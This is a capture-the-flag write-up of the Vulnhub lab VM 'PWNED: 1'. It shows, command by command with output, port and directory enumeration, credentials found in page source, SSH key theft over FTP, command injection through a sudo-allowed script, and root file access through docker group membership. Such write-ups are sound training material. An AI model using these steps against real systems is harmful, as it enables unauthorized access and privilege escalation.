---
title: "Vulnhub - PWNED: 1"
date: 2020-09-04T23:03:30-06:00
summary: "Writeup for for the PWNED: 1 VM from Vulnhub."
draft: false
hidden: false
externalURL: false
showDate: true
showModDate: true
showReadingTime: true
showTags: true
showPagination: true
invertPagination: true
showToC: true
openToC: false
showComments: false
showHeadingAnchors: true
---

## Overview
---

Notes for my completion of the Vulnhub machine PWNED: 1 by Ajs Walker.
Description

Below is the description provided by the author of the VM.

- VM name: Pwned
- Difficulty: Easy
- DHCP: Enabled
- Goal: 3 flags

This works better with VirtualBox rather than VMware.

Below is a link to the Vulnhub machine.

- [PWNED: 1](https://www.vulnhub.com/entry/pwned-1,507/)

# Enumeration
---

Started out with enumerating services on the VM with an Nmap scan. Looks like the server is hosting an FTP and web server. SSH is available on the VM as well. Looks like this is a Debian/Ubuntu box.

```sh
nmap -sS -A -p- -O -sV 192.168.56.101
```

Below is the output from the Nmap command.

```sh
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 23:12 CDT
Nmap scan report for 192.168.56.101
Host is up (0.00070s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
MAC Address: 08:00:27:9D:19:73 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/4%OT=21%CT=1%CU=36412%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=5F531039%P=x86_64-redhat-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%I
OS:I=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW
OS:7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88
OS:%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.23 seconds

Scanned the VM with Nikto and it found a page named /nothing/ in the robots.txt file on the web server.
```

```sh
nikto -host http://192.168.56.101
```

Below is the output from the Nikto command.

```sh
- ***** RFIURL is not defined in nikto.conf--no RFI tests will run *****
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        80
+ Start Time:         2020-09-04 23:18:55 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0xbf9 0x5a9c7ca4a3440 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /nothing/: Directory indexing found.
+ Entry '/nothing/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 5089 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-09-04 23:19:03 (GMT-5) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Decided to install Gobuster and brute force any directories that Nikto might be missing. Looks like it also found the /nothing/. But, It also found a page named /server-status and /hidden-text. The hidden-text page more interesting than the others. So, I’m going to focus on that.

```sh
gobuster dir -u http://192.168.56.101/ -w wordlists/dir_bruting/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.101/
[+] Threads:        10
[+] Wordlist:       wordlists/dir_bruting/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/04 23:29:47 Starting gobuster
===============================================================
/nothing (Status: 301)
/server-status (Status: 403)
/hidden_text (Status: 301)
===============================================================
2020/09/04 23:30:49 Finished
===============================================================
```

Investigated the hidden-text page a little further by going to it with curl. Looks like there is a dictionary file named secret.dic on the server.

```sh
curl http://192.168.56.101/hidden_text/
```

Below is the output from the curl(1) command.

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /hidden_text</title>
 </head>
 <body>
<h1>Index of /hidden_text</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="secret.dic">secret.dic</a></td><td align="right">2020-07-09 18:37  </td><td align="right">211 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.38 (Debian) Server at 192.168.56.101 Port 80</address>
</body></html>
```

Downloaded the secret.dic file using wget so I could continue using it for later.

```sh
wget http://192.168.56.101/hidden_text/secret.dic
```

Below is the output from the command.

```sh
--2020-09-04 23:33:17--  http://192.168.56.101/hidden_text/secret.dic
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 211
Saving to: ‘secret.dic’

secret.dic                    100%[===============================================>]     211  --.-KB/s    in 0s      

2020-09-04 23:33:17 (11.8 MB/s) - ‘secret.dic’ saved [211/211]
```

Ran the dictionary file secret.dic against the web server on the VM and it found a page named pwned.vuln.

```sh
gobuster dir -u http://192.168.56.101/ -w secret.dic 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.101/
[+] Threads:        10
[+] Wordlist:       secret.dic
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/04 23:33:58 Starting gobuster
===============================================================
//pwned.vuln (Status: 301)
===============================================================
2020/09/04 23:33:58 Finished
===============================================================
```

Looks like someone named vanakam nanba hacked the login page. Looks like someone named vanakam nanba hacked the login page. on further inspection of the pwned.vuln page looks like there are FTP credentials commented out in the source of the page. Below are the credentials found.

- Username: ftpuser
- Password: B0ss_B!TcH

Now I’m going to start diverting my attention to the FTP server.

```sh
curl http://192.168.56.101/pwned.vuln/
```

```html
<!DOCTYPE html>
<html>
<head> 
	<title>login</title>
</head>
<body>
		<div id="main">
			<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
			<form method="POST">
			Username <input type="text" name="username" class="text" autocomplete="off" required>
			Password <input type="password" name="password" class="text" required>
			<input type="submit" name="submit" id="sub">
			</form>
			</div>
</body>
</html>
```


```php
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

Logged into the FTP server with the credentials found in the source of the pwned.vuln page. This provides two files which are a private key for the SSH server - guessing - and a file named note.txt.

```sh
ftp 192.168.56.101
Connected to 192.168.56.101 (192.168.56.101).
220 (vsFTPd 3.0.3)
Name (192.168.56.101:timothyl): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
227 Entering Passive Mode (192,168,56,101,112,223).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> dir
227 Entering Passive Mode (192,168,56,101,122,32).
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa
-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
227 Entering Passive Mode (192,168,56,101,244,206).
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
226 Transfer complete.
2602 bytes received in 0.00458 secs (568.62 Kbytes/sec)
ftp> get note.txt
local: note.txt remote: note.txt
227 Entering Passive Mode (192,168,56,101,41,153).
150 Opening BINARY mode data connection for note.txt (75 bytes).
226 Transfer complete.
75 bytes received in 0.00501 secs (14.98 Kbytes/sec)
ftp> 
```

## Flag 1
---

Decided to open and read the note.txt file and it shows the following information. Looks like there is the name of a user in there. Specifically named ariana. This could be the username for the next account.

```sh
cat note.txt 

Wow you are here 

ariana won't happy about this note 

sorry ariana :( 
```

It’s possible that the SSH key hosted on the FTP server is the private key for Ariana’s account. Used the -i flag ssh to use the private key to ssh into her account and it was successful. Checked the contents of the directory and it looks like there are files named user1.txt and ariana-personal.diary.

```sh
ssh -i id_rsa ariana@192.168.56.101
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
ariana@pwned:~$ ls -la
total 40
drwxrwx--- 4 ariana ariana 4096 Jul 10 12:55 .
drwxr-xr-x 5 root   root   4096 Jul 10 11:21 ..
-rw-r--r-- 1 ariana ariana  142 Jul 10 11:57 ariana-personal.diary
-rw------- 1 ariana ariana    4 Jul 10 13:06 .bash_history
-rw-r--r-- 1 ariana ariana  220 Jul  4 19:21 .bash_logout
-rw-r--r-- 1 ariana ariana 3526 Jul  4 19:21 .bashrc
drwxr-xr-x 3 ariana ariana 4096 Jul  6 17:18 .local
-rw-r--r-- 1 ariana ariana  807 Jul  4 19:21 .profile
drwx------ 2 ariana ariana 4096 Jul  9 15:01 .ssh
-rw-r--r-- 1 ariana ariana  143 Jul 10 11:51 user1.txt
```

Looked at the file user1.txt and it looks like we found the flag.

```sh
more user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

Below is the first flag:

- Flag 1: fb8d98be1265dd88bac522e1b2182140

## Flag 2
---

Looked at the file named ariana-personal.diary and it looks like Selena fought with Ariana over Ajay. So she opened her hidden_text file on the server. Ariana is claiming that Selena is responsible. Ok.

```sh
more ariana-personal.diary 
Its Ariana personal Diary :::

Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
```

Couldn’t find anything else in the home directory. So I checked a couple of environment variables. Didn’t find much. Listed the commands that were allowed to run using sudo and it looks like Selena can run the /home/messenger.sh file with no password.

```sh
sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

I know that there is a command injection vulnerability in this script somewhere. I’m thinking its in the message portion. The message portion is redirecting STDERR to /dev/null and may prove fruitful.

```sh
more /home/messenger.sh 
#!/bin/bash

clear
echo "Welcome to linux.messenger "
		echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
		echo ""
echo "$users"
		echo ""
read -p "Enter username to send message : " name 
		echo ""
read -p "Enter message for $name :" msg
		echo ""
echo "Sending message to $name "

$msg 2> /dev/null

		echo ""
echo "Message sent to $name :) "
		echo ""
```

Decided to run it without doing anything and it looks like it just notifies me that it’s sending the message to Selina.

```sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :test

Sending message to selena 

Message sent to selena :) 
```

I ran it again with sudo and in the message portion I started a bash shell with /bin/bash. After sending the message it stops and it looks like I might have a shell. So, I decided to spawn a shell using Python’s pty library which spawns a full shell as the user selena.

I enter the id command and it looks like selena is part of the docker group on the machine. Which may come in handy later.

```sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena 
python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Checked the contents of the directory. Looks like there is a file named user2.txt in the directory. Looks like the flag is in the output below.

```sh
elena@pwned:~$ ls
selena-personal.diary  user2.txt
selena@pwned:~$ cat user2.txt 
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

Below is Flag 2.

- Flag 2: 711fdfc6caad532815a440f7f295c176

Looks like we know who exposed Ariana’s private ssh key on the FTP server.

```sh
selena@pwned:~$ cat selena-personal.diary 
Its Selena personal Diary :::

Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
```

## Flag 3
---

While obtaining Flag 2, I could see that Selena was part of the docker group. So, I decided to focus on this specifically. Checked to see which container images are available on the VM. Looks like there is an image named privsec which I found interesting.

Based on my understanding. Docker runs with a SUID bit that gives the user running the docker command as root.

```sh
selena@pwned:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        2 months ago        88.3MB
<none>              <none>              e13ad046d435        2 months ago        88.3MB
alpine              latest              a24bb4013296        3 months ago        5.57MB
debian              wheezy              10fcec6d95c4        18 months ago       88.3MB
```

To test this, I decided to run the docker command with the -v flag that will mount the /mnt directory on the /root directory of the host and ran the container image. This allowed me to list the contents of the /mnt directory. Which is actually running the user as root.

Looks like there is a file named root.txt. Decided to open the file. Looks like the next flag is available and we are able to run commands as root.

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc ls -la /mnt
```

Below is the output for the command above.

```sh
total 28
drwx------ 3 root root 4096 Jul 10 07:32 .
drwxr-xr-x 1 root root 4096 Sep  5 05:44 ..
-rw------- 1 root root  292 Jul 10 07:36 .bash_history
-rw-r--r-- 1 root root  601 Jul  6 12:40 .bashrc
drwxr-xr-x 3 root root 4096 Jul  4 14:02 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  429 Jul 10 06:41 root.txt
```

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc ls -la /mnt/root.txt
```

```sh
-rw-r--r-- 1 root root 429 Jul 10 06:41 /mnt/root.txt
```

Opened the /mnt/root.txt file using the following command.

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc cat /mnt/root.txt
```

Below is the output fro the command above.

```sh
4d4098d64e163d2726959455d046fd7c



You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker 
```

## Conclusion
---

This was a fun challenge. I haven’t done a Vulnhub VM in a while. Took a little while to figure this out and publish. But, here we are. This machine tought me about a couple of really bad security practices. One shown below.

- Don’t add users to the docker group.

Things that I already knew.

- Don’t embed credentials in the comments of your website.
- Don’t host public ssh keys on on a publicly accessible FTP server.